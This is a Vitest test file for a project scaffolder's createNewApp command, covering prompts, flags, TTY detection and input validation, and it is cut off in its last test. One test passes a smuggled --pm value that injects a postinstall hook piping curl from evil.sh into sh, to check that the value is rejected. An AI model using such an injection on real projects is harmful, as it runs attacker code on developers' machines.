import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import type { App } from "../src/helpers/app";

/**
 * End-to-end coverage of the scaffolder's command entry (`createNewApp`) with
 * every side-effecting collaborator mocked: the @clack prompts, the package
 * manager probes, the app path reservation, and crucially `createWarlockApp`
 * (the real installer) so NOTHING spawns a process or touches the disk.
 *
 * The strategy: each prompt mock pulls its next answer from a queue the test
 * primes, mirroring a user clicking through the wizard. `isCancel` recognises a
 * single shared sentinel so cancellation can be injected at any step.
 */

const CANCEL = Symbol("clack.cancel");

// --- @clack/prompts ----------------------------------------------------------
const text = vi.fn();
const select = vi.fn();
const multiselect = vi.fn();
const confirm = vi.fn();
const cancel = vi.fn();

vi.mock("@clack/prompts", () => ({
  text: (...args: unknown[]) => text(...args),
  select: (...args: unknown[]) => select(...args),
  multiselect: (...args: unknown[]) => multiselect(...args),
  confirm: (...args: unknown[]) => confirm(...args),
  cancel: (...args: unknown[]) => cancel(...args),
  isCancel: (value: unknown) => value === CANCEL,
  // spinner/log are pulled in transitively by create-warlock-app, but that
  // module is mocked below, so these are only here for completeness.
  spinner: () => ({ start: vi.fn(), stop: vi.fn() }),
  log: { error: vi.fn(), warn: vi.fn() },
}));

// --- @warlock.js/fs (version read) ------------------------------------------
vi.mock("@warlock.js/fs", () => ({
  getJsonFile: () => ({ version: "9.9.9" }),
}));

// --- banner (silence the ASCII art) -----------------------------------------
vi.mock("../src/ui/banner", () => ({
  showIntroBanner: vi.fn(),
}));

// --- package manager ---------------------------------------------------------
const detectPackageManagers = vi.fn(async () => undefined);
const getSystemPackageManagers = vi.fn(() => ["npm", "yarn", "pnpm"]);
const getPreferredPackageManager = vi.fn(() => "yarn");
const setPackageManager = vi.fn();
const getPackageManager = vi.fn(() => "yarn");

vi.mock("../src/helpers/package-manager", () => {
  const allowed = ["npm", "yarn", "pnpm", "bun"];

  return {
    detectPackageManagers: (...args: unknown[]) =>
      detectPackageManagers(...args),
    getSystemPackageManagers: (...args: unknown[]) =>
      getSystemPackageManagers(...args),
    getPreferredPackageManager: (...args: unknown[]) =>
      getPreferredPackageManager(...args),
    setPackageManager: (...args: unknown[]) => setPackageManager(...args),
    getPackageManager: (...args: unknown[]) => getPackageManager(...args),
    ALLOWED_PACKAGE_MANAGERS: allowed,
    isValidPackageManager: (value: string) => allowed.includes(value),
  };
});

// --- app path reservation ----------------------------------------------------
const getAppPath = vi.fn(() => "/tmp/reserved-app");

vi.mock("../src/commands/create-new-app/get-app-path", () => ({
  default: (...args: unknown[]) => getAppPath(...args),
}));

// --- TTY detection -------------------------------------------------------
// Defaults to "interactive" (a real terminal) so every existing prompt-driven
// test below keeps exercising the prompt flow. Individual tests flip this to
// simulate the no-TTY case (CI, a script, an agent harness) WITHOUT relying on
// this test runner's own stdin, which is not a TTY either — the whole point
// of mocking it.
const hasInteractiveStdin = vi.fn(() => true);

vi.mock("../src/helpers/tty", () => ({
  hasInteractiveStdin: (...args: unknown[]) => hasInteractiveStdin(...args),
}));

// --- agent-kit targets ------------------------------------------------------
// The real module reads the installed @mongez/agent-kit and falls back to a
// NETWORK fetch, so leaving it unmocked makes every wizard test do I/O and
// depend on connectivity. The valid-target lookup is a mock so the offline
// branch can be driven deliberately.
const getValidAgentKitTargets = vi.fn(async () => [
  "claude",
  "codex",
  "cursor",
]);

vi.mock("../src/features/agent-kit-targets", () => ({
  BUILTIN_AGENT_KIT_TARGETS: ["claude"],
  DEFAULT_AGENT_KIT_TARGET: "claude",
  getValidAgentKitTargets: (...args: unknown[]) =>
    getValidAgentKitTargets(...args),
  resolveAgentTargets: async (requested?: string[]) =>
    requested && requested.length > 0 ? requested : ["claude"],
}));

// --- the installer we must NEVER actually run -------------------------------
const createWarlockApp = vi.fn(async () => undefined);

vi.mock("../src/commands/create-warlock-app", () => ({
  createWarlockApp: (...args: unknown[]) => createWarlockApp(...args),
}));

import createNewApp from "../src/commands/create-new-app";

class ProcessExit extends Error {
  public constructor(public code?: number) {
    super(`process.exit(${code})`);
  }
}

let exitSpy: ReturnType<typeof vi.spyOn>;
let logSpy: ReturnType<typeof vi.spyOn>;

/**
 * Read the `App` descriptor that was handed to the (mocked) installer so tests
 * can assert on the assembled selections.
 */
function capturedApp(): App {
  expect(createWarlockApp).toHaveBeenCalledTimes(1);
  return createWarlockApp.mock.calls[0][0] as App;
}

beforeEach(() => {
  vi.clearAllMocks();
  // `clearAllMocks` clears recorded CALLS but not a pending
  // `mockResolvedValueOnce` queue — so a test that primes an answer it never
  // consumes silently hands that answer to the NEXT test, which then fails
  // somewhere unrelated. Drain the prompt queues explicitly.
  [text, select, multiselect, confirm].forEach(mock => mock.mockReset());
  // Re-seed the defaults the mocks lost on clear.
  getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm"]);
  getPreferredPackageManager.mockReturnValue("yarn");
  getPackageManager.mockReturnValue("yarn");
  getAppPath.mockReturnValue("/tmp/reserved-app");
  detectPackageManagers.mockResolvedValue(undefined);
  createWarlockApp.mockResolvedValue(undefined);
  hasInteractiveStdin.mockReturnValue(true);

  exitSpy = vi.spyOn(process, "exit").mockImplementation((code?: number) => {
    throw new ProcessExit(code);
  });
  logSpy = vi.spyOn(console, "log").mockImplementation(() => undefined);
});

afterEach(() => {
  exitSpy.mockRestore();
  logSpy.mockRestore();
});

/**
 * Prime the six interactive prompts (name, pm, db, features, ai, git, jwt) with
 * happy-path answers. Overrides replace individual steps.
 */
function primeHappyPath(
  overrides: {
    name?: unknown;
    pm?: unknown;
    db?: unknown;
    features?: unknown;
    ai?: unknown;
    agents?: unknown;
    git?: unknown;
    jwt?: unknown;
  } = {},
) {
  text.mockResolvedValueOnce(overrides.name ?? "my-warlock-app");
  select
    .mockResolvedValueOnce(overrides.pm ?? "yarn") // package manager
    .mockResolvedValueOnce(overrides.db ?? "postgres"); // database driver
  multiselect
    .mockResolvedValueOnce(overrides.features ?? ["test"]) // features
    .mockResolvedValueOnce(overrides.ai ?? ["openai"]) // ai providers
    .mockResolvedValueOnce(overrides.agents ?? ["claude"]); // agent-kit targets
  confirm
    .mockResolvedValueOnce(overrides.git ?? true) // git
    .mockResolvedValueOnce(overrides.jwt ?? true); // jwt
}

describe("createNewApp — preamble guards", () => {
  it("shows the intro banner with the version read from package.json", async () => {
    primeHappyPath();

    await createNewApp({ interactive: true });

    const { showIntroBanner } = await import("../src/ui/banner");
    expect(showIntroBanner).toHaveBeenCalledWith("9.9.9");
  });

  it("refuses to run on Node older than 20 and exits 0", async () => {
    const descriptor = Object.getOwnPropertyDescriptor(
      process.versions,
      "node",
    );
    Object.defineProperty(process.versions, "node", {
      value: "18.20.0",
      configurable: true,
    });

    try {
      await expect(createNewApp({ yes: true, name: "app" })).rejects.toThrow(
        ProcessExit,
      );
      expect(cancel).toHaveBeenCalledWith(
        "Node.js version must be at least 20.0.0",
      );
      // The guard precedes the non-interactive branch, so nothing is built.
      expect(createWarlockApp).not.toHaveBeenCalled();
    } finally {
      if (descriptor) {
        Object.defineProperty(process.versions, "node", descriptor);
      }
    }
  });
});

describe("createNewApp — interactive flow", () => {
  it("assembles the full app descriptor from the prompt answers", async () => {
    primeHappyPath();

    await createNewApp({ interactive: true });

    const app = capturedApp();
    expect(app.name).toBe("my-warlock-app");
    expect(app.path).toBe("/tmp/reserved-app");
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.databasePort).toBe(5432);
    expect(app.options.features).toEqual(["test"]);
    expect(app.options.aiProviders).toEqual(["openai"]);
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(true);
  });

  it("defaults the database port to 27017 for the mongodb driver", async () => {
    primeHappyPath({ db: "mongodb" });

    await createNewApp({ interactive: true });

    expect(capturedApp().options.databasePort).toBe(27017);
  });

  it("commits the chosen package manager through setPackageManager", async () => {
    primeHappyPath({ pm: "pnpm" });

    await createNewApp({ interactive: true });

    expect(setPackageManager).toHaveBeenCalledWith("pnpm");
  });

  it("awaits package-manager detection before listing options", async () => {
    primeHappyPath();

    await createNewApp({ interactive: true });

    expect(detectPackageManagers).toHaveBeenCalled();
    expect(getSystemPackageManagers).toHaveBeenCalled();
  });

  it("reserves the app path from the typed project name", async () => {
    primeHappyPath({ name: "shop-api" });

    await createNewApp({ interactive: true });

    expect(getAppPath).toHaveBeenCalledWith("shop-api");
  });

  it("treats useGit=false / useJWT=false when the user declines", async () => {
    primeHappyPath({ git: false, jwt: false });

    await createNewApp({ interactive: true });

    const app = capturedApp();
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("allows an empty feature and AI selection", async () => {
    primeHappyPath({ features: [], ai: [] });

    await createNewApp({ interactive: true });

    const app = capturedApp();
    expect(app.options.features).toEqual([]);
    expect(app.options.aiProviders).toEqual([]);
  });

  it("offers None last for AI and normalizes it away before scaffolding", async () => {
    primeHappyPath({ ai: ["none"] });

    await createNewApp({ interactive: true });

    const aiPrompt = multiselect.mock.calls[1][0] as {
      options: { value: string; label: string }[];
    };
    expect(aiPrompt.options.at(-1)).toMatchObject({
      value: "none",
      label: "None",
    });
    expect(capturedApp().options.aiProviders).toEqual([]);
  });

  it("warns and re-prompts when None is combined with AI packages", async () => {
    primeHappyPath({ ai: ["none", "ai-openai"] });
    multiselect.mockReset();
    multiselect
      .mockResolvedValueOnce(["test"])
      .mockResolvedValueOnce(["none", "ai-openai"])
      .mockResolvedValueOnce(["ai-openai"])
      .mockResolvedValueOnce(["claude"]);

    await createNewApp({ interactive: true });

    const { log } = await import("@clack/prompts");
    expect(log.warn).toHaveBeenCalledWith(
      "Choose None by itself, or select one or more AI packages.",
    );
    expect(multiselect.mock.calls[2][0].initialValues).toEqual(["ai-openai"]);
    expect(capturedApp().options.aiProviders).toEqual(["ai-openai"]);
  });

  it("allows cancellation after a conflicting AI selection", async () => {
    primeHappyPath({ ai: ["none", "ai-openai"] });
    multiselect.mockReset();
    multiselect
      .mockResolvedValueOnce(["test"])
      .mockResolvedValueOnce(["none", "ai-openai"])
      .mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith("AI provider selection cancelled");
  });
});

describe("createNewApp — cancellation guards", () => {
  it("aborts when the project name is cancelled", async () => {
    text.mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith(
      "A project name is required to continue",
    );
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("aborts when the project name is blank (whitespace only)", async () => {
    text.mockResolvedValueOnce("   ");

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith(
      "A project name is required to continue",
    );
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("stops without exiting when getAppPath returns falsy (collision already handled)", async () => {
    text.mockResolvedValueOnce("my-app");
    getAppPath.mockReturnValue(undefined as unknown as string);

    await createNewApp({ interactive: true });

    // getAppPath owns the exit on collision; createNewApp just returns early.
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
  });

  it("aborts when the package manager step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith("Package manager selection cancelled");
    expect(setPackageManager).not.toHaveBeenCalled();
  });

  it("aborts when the database step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith("Database selection cancelled");
  });

  it("aborts when the features step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect.mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith("Feature selection cancelled");
  });

  it("aborts when the AI providers step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect.mockResolvedValueOnce(["test"]).mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith("AI provider selection cancelled");
  });

  it("known bug: a cancelled git confirm is NOT caught — it silently becomes useGit=false", async () => {
    // known bug: useGit = (await confirm()) === true runs BEFORE isCancel(useGit),
    // so the CANCEL symbol is coerced to `false` and isCancel(false) never fires.
    // The wizard therefore proceeds instead of aborting on a cancelled git prompt.
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect
      .mockResolvedValueOnce(["test"])
      .mockResolvedValueOnce([])
      .mockResolvedValueOnce(["claude"]); // agent-kit targets
    // First confirm (git) is cancelled; second confirm (jwt) falls back to the
    // default mock (undefined) -> useJWT false. No cancel guard trips.
    confirm.mockResolvedValueOnce(CANCEL);

    await createNewApp({ interactive: true });

    expect(cancel).not.toHaveBeenCalled();
    const app = capturedApp();
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("known bug: a cancelled jwt confirm is NOT caught — it silently becomes useJWT=false", async () => {
    // known bug: same `=== true` coercion swallows the CANCEL symbol on the JWT
    // confirm, so the flow completes with useJWT=false instead of aborting.
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect
      .mockResolvedValueOnce(["test"])
      .mockResolvedValueOnce([])
      .mockResolvedValueOnce(["claude"]); // agent-kit targets
    confirm.mockResolvedValueOnce(true).mockResolvedValueOnce(CANCEL);

    await createNewApp({ interactive: true });

    expect(cancel).not.toHaveBeenCalled();
    const app = capturedApp();
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(false);
  });

  it("treats a non-true git answer as useGit=false (only strict true enables git)", async () => {
    // confirm returns `false` -> `=== true` is false -> useGit false, no cancel.
    primeHappyPath({ git: false });

    await createNewApp({ interactive: true });

    expect(capturedApp().options.useGit).toBe(false);
    expect(cancel).not.toHaveBeenCalled();
  });
});

describe("createNonInteractive (--yes)", () => {
  it("builds the descriptor straight from flags with no prompts", async () => {
    await createNewApp({
      yes: true,
      name: "flagged-app",
      db: "postgres",
      features: ["test", "herald"],
      ai: ["ai-openai", "ai-anthropic"],
      pm: "pnpm",
      git: true,
      jwt: true,
    });

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();

    const app = capturedApp();
    expect(app.name).toBe("flagged-app");
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.databasePort).toBe(5432);
    expect(app.options.features).toEqual(["test", "herald"]);
    expect(app.options.aiProviders).toEqual(["ai-openai", "ai-anthropic"]);
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(true);
    expect(setPackageManager).toHaveBeenCalledWith("pnpm");
  });

  it("defaults db to mongodb and git/jwt to false when flags are omitted", async () => {
    await createNewApp({ yes: true, name: "minimal" });

    const app = capturedApp();
    expect(app.options.databaseDriver).toBe("mongodb");
    expect(app.options.databasePort).toBe(27017);
    expect(app.options.features).toEqual([]);
    expect(app.options.aiProviders).toEqual([]);
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("falls back to the preferred package manager when --pm is absent", async () => {
    getPreferredPackageManager.mockReturnValue("yarn");

    await createNewApp({ yes: true, name: "app" });

    expect(setPackageManager).toHaveBeenCalledWith("yarn");
  });

  it("exits 1 when --yes is given without a project name", async () => {
    await expect(createNewApp({ yes: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith(expect.stringContaining("--yes"));
    expect(cancel).toHaveBeenCalledWith(expect.stringContaining("--name="));
    expect(exitSpy).toHaveBeenCalledWith(1);
  });

  it("exits 1 when --yes is given with a whitespace-only name", async () => {
    await expect(createNewApp({ yes: true, name: "   " })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith(expect.stringContaining("--yes"));
  });

  it("accepts every detected --pm value", async () => {
    getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm", "bun"]);

    for (const pm of ["npm", "yarn", "pnpm", "bun"]) {
      setPackageManager.mockClear();
      cancel.mockClear();

      await createNewApp({ yes: true, name: "app", pm });

      expect(cancel).not.toHaveBeenCalled();
      expect(setPackageManager).toHaveBeenCalledWith(pm);
    }
  });

  it("refuses an unavailable --pm before non-interactive scaffolding begins", async () => {
    await expect(
      createNewApp({ yes: true, name: "app", pm: "bun" }),
    ).rejects.toThrow(ProcessExit);

    expect(cancel).toHaveBeenCalledWith(
      expect.stringContaining('Package manager "bun"'),
    );
    expect(setPackageManager).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("exits 1 on a --pm value outside the allow-list instead of reaching setPackageManager", async () => {
    await expect(
      createNewApp({
        yes: true,
        name: "app",
        pm: 'pnpm","postinstall":"curl${IFS}evil.sh|sh#',
      }),
    ).rejects.toThrow(ProcessExit);

    expect(cancel).toHaveBeenCalledWith(
      expect.stringContaining("Unknown package manager"),
    );
    expect(setPackageManager).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(exitSpy).toHaveBeenCalledWith(1);
  });

  it("exits 1 on an unknown database driver", async () => {
    await expect(
      createNewApp({ yes: true, name: "app", db: "oracle" }),
    ).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith('Unknown database driver "oracle"');
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("exits 1 listing every unknown feature / provider key", async () => {
    await expect(
      createNewApp({
        yes: true,
        name: "app",
        features: ["test", "bogus"],
        ai: ["openai", "nope"],
      }),
    ).rejects.toThrow(ProcessExit);

    expect(cancel).toHaveBeenCalledTimes(1);
    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("bogus");
    expect(message).toContain("nope");
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("accepts the full known feature + provider + package set without complaint", async () => {
    await createNewApp({
      yes: true,
      name: "app",
      features: ["react", "test", "redis"],
      ai: [
        "ai-openai",
        "ai-google",
        "ai-anthropic",
        "ai-bedrock",
        "ai-ollama",
        "ai-tools",
        "ai-panoptic",
        "ai-workspace",
      ],
    });

    expect(cancel).not.toHaveBeenCalled();
    expect(createWarlockApp).toHaveBeenCalledTimes(1);
  });

  it("returns early (no exit) when getAppPath yields falsy in non-interactive mode", async () => {
    getAppPath.mockReturnValue(undefined as unknown as string);

    await createNewApp({ yes: true, name: "app" });

    // getAppPath returns falsy AFTER the top-level detection kicks off but BEFORE
    // the package manager is committed, so the installer never runs and no
    // package manager is set.
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(setPackageManager).not.toHaveBeenCalled();
  });

  it("routes through createNonInteractive and never touches the prompt fns", async () => {
    await createNewApp({ yes: true, name: "app", db: "mongodb" });

    expect(text).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
    expect(createWarlockApp).toHaveBeenCalledTimes(1);
  });
});

describe("createNewApp — non-TTY stdin (no keyboard to prompt at)", () => {
  it("proceeds non-interactively with no --yes, once a name is available, without ever calling a prompt", async () => {
    hasInteractiveStdin.mockReturnValue(false);

    await createNewApp({ name: "ci-app", features: ["test"] });

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();

    const app = capturedApp();
    expect(app.name).toBe("ci-app");
    expect(app.options.features).toEqual(["test"]);
    // Same defaults --yes documents: mongodb, no git, no jwt.
    expect(app.options.databaseDriver).toBe("mongodb");
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("produces the identical descriptor as the equivalent --yes invocation (one path, not two)", async () => {
    const flags = {
      db: "postgres",
      features: ["test", "herald"],
      ai: ["ai-openai"],
      pm: "pnpm",
      git: true,
      jwt: true,
    } as const;

    hasInteractiveStdin.mockReturnValue(true);
    await createNewApp({ ...flags, yes: true, name: "twin-a" });
    const viaYes = capturedApp();

    vi.clearAllMocks();
    getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm"]);
    getPreferredPackageManager.mockReturnValue("yarn");
    getPackageManager.mockReturnValue("yarn");
    getAppPath.mockReturnValue("/tmp/reserved-app");
    detectPackageManagers.mockResolvedValue(undefined);
    createWarlockApp.mockResolvedValue(undefined);

    hasInteractiveStdin.mockReturnValue(false);
    await createNewApp({ ...flags, name: "twin-a" });
    const viaNoTty = capturedApp();

    expect(viaNoTty.options).toEqual(viaYes.options);
  });

  it("fails BEFORE any prompt is attempted, naming --yes and --name, when no name is available either — never a libuv crash", async () => {
    hasInteractiveStdin.mockReturnValue(false);

    await expect(createNewApp({})).rejects.toThrow(ProcessExit);

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--yes");
    expect(message).toContain("--name=");
    expect(message).not.toContain("uv_tty_init");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("--interactive still runs the full wizard when a TTY IS present and --yes was not passed, even if flags are given", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    primeHappyPath({ name: "interactive-app" });

    await createNewApp({ interactive: true });

    expect(text).toHaveBeenCalledTimes(1);
    expect(capturedApp().name).toBe("interactive-app");
    // Still the full wizard: every other question was asked too.
    expect(multiselect).toHaveBeenCalledTimes(3);
    expect(confirm).toHaveBeenCalledTimes(2);
  });

  /**
   * Every one of these used to resolve in SILENCE: --yes won the branch above
   * and --customize was dropped without a word, so the run looked like it had
   * succeeded while asking none of the questions the flag was passed for.
   */
  it("refuses --customize together with --yes, naming both flags", async () => {
    hasInteractiveStdin.mockReturnValue(true);

    await expect(
      createNewApp({ interactive: true, yes: true, name: "x" }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--customize");
    expect(message).toContain("--yes");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
  });

  it("refuses --customize when stdin is not a TTY, instead of silently scaffolding defaults", async () => {
    hasInteractiveStdin.mockReturnValue(false);

    await expect(
      createNewApp({ interactive: true, name: "x" }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--customize");
    expect(message).toContain("TTY");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  /**
   * Every flag below used to be ACCEPTED and then ignored by the wizard — the
   * run succeeded with the wrong answer, which is worse than refusing it.
   * They are answers given early: each one opens its prompt on that value.
   */
  it("pre-selects every wizard prompt from the flags instead of dropping them", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    primeHappyPath();

    await createNewApp({
      interactive: true,
      name: "seeded-app",
      pm: "pnpm",
      db: "postgres",
      features: ["test"],
      ai: ["ai-openai"],
      git: false,
      jwt: false,
    });

    const [pmPrompt, dbPrompt] = select.mock.calls.map(call => call[0]);
    expect(pmPrompt.initialValue).toBe("pnpm");
    expect(dbPrompt.initialValue).toBe("postgres");

    const [featuresPrompt, aiPrompt] = multiselect.mock.calls.map(
      call => call[0],
    );
    expect(featuresPrompt.initialValues).toEqual(["test"]);
    expect(aiPrompt.initialValues).toEqual(["ai-openai"]);

    const [gitPrompt, jwtPrompt] = confirm.mock.calls.map(call => call[0]);
    expect(gitPrompt.initialValue).toBe(false);
    expect(jwtPrompt.initialValue).toBe(false);
  });

  it("carries --stack=web into the wizard as a pre-ticked web feature, since the wizard has no stack question", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    primeHappyPath();

    await createNewApp({ interactive: true, name: "x", stack: "web" });

    const featuresPrompt = multiselect.mock.calls[0][0];
    expect(featuresPrompt.initialValues).toContain("web");
  });

  /**
   * `bun` is in ALLOWED_PACKAGE_MANAGERS, so it passes the spelling check —
   * but the wizard's prompt is built from getSystemPackageManagers(), so an
   * undetected manager can never appear as an option and the seed would be
   * accepted and then silently dropped.
   */
  it("refuses a --pm the machine does not have, rather than seeding an option the prompt cannot offer", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm"]);

    await expect(
      createNewApp({ interactive: true, name: "x", pm: "bun" }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("bun");
    expect(message).toContain("npm, yarn, pnpm");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(select).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("accepts a --pm the machine DOES have, and seeds the prompt with it", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm", "bun"]);
    primeHappyPath();

    await createNewApp({ interactive: true, name: "x", pm: "bun" });

    expect(cancel).not.toHaveBeenCalled();
    expect(select.mock.calls[0][0].initialValue).toBe("bun");
  });

  /**
   * Customize asks about everything, coding agents included (owner ruling,
   * seq 1028). The list is fetched, so the offline branch matters: losing six
   * already-given answers to a failed HTTP request is not acceptable.
   */
  it("asks which coding agents to set up, offering the fetched targets", async () => {
    getValidAgentKitTargets.mockResolvedValueOnce([
      "claude",
      "codex",
      "cursor",
    ]);
    primeHappyPath({ agents: ["codex"] });

    await createNewApp({ interactive: true });

    const agentsPrompt = multiselect.mock.calls[2][0];
    expect(
      agentsPrompt.options.map((option: { value: string }) => option.value),
    ).toEqual(["claude", "codex", "cursor"]);
    expect(agentsPrompt.initialValues).toEqual(["claude"]);
    expect(capturedApp().options.agents).toEqual(["codex"]);
  });

  it("pre-ticks --agents rather than asking from scratch", async () => {
    primeHappyPath({ agents: ["cursor"] });

    await createNewApp({ interactive: true, agents: ["cursor"] });

    expect(multiselect.mock.calls[2][0].initialValues).toEqual(["cursor"]);
  });

  it("falls back to the built-in targets when the list cannot be fetched, and says so", async () => {
    getValidAgentKitTargets.mockRejectedValueOnce(new Error("offline"));
    primeHappyPath();

    await createNewApp({ interactive: true });

    const agentsPrompt = multiselect.mock.calls[2][0];
    expect(
      agentsPrompt.options.map((option: { value: string }) => option.value),
    ).toEqual(["claude"]);
    expect(String(agentsPrompt.message)).toContain("offline");
    // The run COMPLETES — six answered questions are not thrown away.
    expect(capturedApp().options.agents).toEqual(["claude"]);
  });

  it("refuses an --agents target the fetched list does not contain", async () => {
    getValidAgentKitTargets.mockResolvedValueOnce(["claude", "codex"]);
    primeHappyPath();

    await expect(
      createNewApp({ interactive: true, agents: ["not-an-agent"] }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("not-an-agent");
    expect(message).toContain("claude, codex");
    expect(exitSpy).toHaveBeenCalledWith(1);
  });

  it("offers an unrecognised --agents target when the list could NOT be fetched, instead of refusing on no authority", async () => {
    getValidAgentKitTargets.mockRejectedValueOnce(new Error("offline"));
    primeHappyPath({ agents: ["some-new-agent"] });

    await createNewApp({ interactive: true, agents: ["some-new-agent"] });

    expect(cancel).not.toHaveBeenCalled();
    const agentsPrompt = multiselect.mock.calls[2][0];
    expect(
      agentsPrompt.options.map((option: { value: string }) => option.value),
    ).toEqual(["claude", "some-new-agent"]);
    expect(capturedApp().options.agents).toEqual(["some-new-agent"]);
  });

  it("falls back to the default target when nothing is ticked", async () => {
    primeHappyPath({ agents: [] });

    await createNewApp({ interactive: true });

    expect(capturedApp().options.agents).toEqual(["claude"]);
  });

  it("refuses a misspelled --pm in the wizard before any prompt", async () => {
    hasInteractiveStdin.mockReturnValue(true);

    await expect(
      createNewApp({ interactive: true, name: "x", pm: "yarnn" }),
    ).rejects.toThrow(ProcessExit);

    expect(String(cancel.mock.calls[0][0])).toContain("yarnn");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(select).not.toHaveBeenCalled();
  });

  it("refuses an unknown --db before showing a prompt that would ignore it", async () => {
    hasInteractiveStdin.mockReturnValue(true);

    await expect(
      createNewApp({ interactive: true, name: "x", db: "not-a-driver" }),
    ).rejects.toThrow(ProcessExit);

    expect(String(cancel.mock.calls[0][0])).toContain("not-a-driver");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(select).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("--interactive does NOT re-ask for a name that was already given on the command line", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    primeHappyPath();

    await createNewApp({ interactive: true, name: "named-on-the-cli" });

    expect(text).not.toHaveBeenCalled();
    expect(capturedApp().name).toBe("named-on-the-cli");
    // The rest of the wizard still runs — only the answered question is skipped.
    expect(multiselect).toHaveBeenCalledTimes(3);
    expect(confirm).toHaveBeenCalledTimes(2);
  });
});

describe("createNewApp — explicit package-manager values", () => {
  it.each([
    ["non-interactive", { name: "empty-pm", yes: true }],
    ["default TTY", { name: "empty-pm", stack: "api" as const }],
    ["full wizard", { name: "empty-pm", interactive: true }],
  ])("refuses an empty --pm before %s scaffolding", async (_path, flags) => {
